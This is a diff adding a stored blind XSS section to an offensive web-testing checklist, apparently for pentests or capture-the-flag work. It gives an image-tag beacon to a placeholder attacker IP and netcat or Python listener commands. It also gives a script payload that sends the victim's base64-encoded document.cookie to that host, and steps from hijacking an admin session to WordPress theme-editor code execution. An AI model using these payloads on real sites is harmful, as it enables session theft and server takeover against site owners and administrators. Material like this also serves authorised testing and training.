@@ -86,6 +86,23 @@ Work through these for every web target:
 - Check page source and JS files for hardcoded secrets/API keys
 
 ### A03 — Injection
+
+**Stored (Blind) XSS:**
+- Any form that says submissions will be "reviewed by an admin" is a stored XSS target
+- Sanity check first: submit an `<img>` tag pointing to your HTTP server — confirms the payload renders AND the admin's browser can reach you before trying cookie theft
+  ```html
+  <img src="http://YOUR_IP:8888/test.png">
+  ```
+  Start listener: `python3 -m http.server 8888` (or `nc -lvnp 8888`)
+  A hit from the target IP confirms stored XSS works
+- Then escalate to cookie theft:
+  ```html
+  <script>fetch('http://YOUR_IP:8888/?c='+btoa(document.cookie))</script>
+  ```
+- Decode the cookie: `echo "BASE64" | base64 -d`
+- Inject cookie into browser → admin session → theme editor RCE (WordPress)
+- Try XSS in all text fields; email fields may have format validation that blocks it
+
 **SQL Injection:**
 ```bash
 # Manual test — add ' to any input field or URL param
